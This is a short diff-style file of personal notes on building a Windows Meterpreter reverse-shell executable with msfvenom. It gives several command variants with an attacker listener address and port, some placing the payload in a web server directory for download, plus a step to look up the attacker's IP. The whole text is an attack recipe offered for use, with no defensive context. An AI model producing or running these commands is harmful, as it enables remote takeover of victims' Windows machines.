@@ -1,0 +1,22 @@
+msfvenom -h
+
+ifconfig
+
+choose one wlan0, eth inet is IP Address
+
+
+msfvenom -p windows/meterpreter/reverse_tcp LPORT=7777 LHOST=192.168.1.100 -f exe -R > /var/www/html/winpayload.exe
+
+(or)
+
+msfvenom -p windows/meterpreter/reverse_tcp LPORT=7777 LHOST=192.168.1.100 -f exe -o ~/winpayload.exe
+
+(or)
+
+sudo msfvenom -p windows/meterpreter/reverse_tcp LPORT=7777 LHOST=192.168.1.100 -f exe -o /var/www/html/winpayload.exe
+
+(or)
+
+cd Desktop
+
+msfvenom -p windows/meterpreter/reverse_tcp LPORT=7777 LHOST=192.168.1.100 -f exe -o winpayload.exe
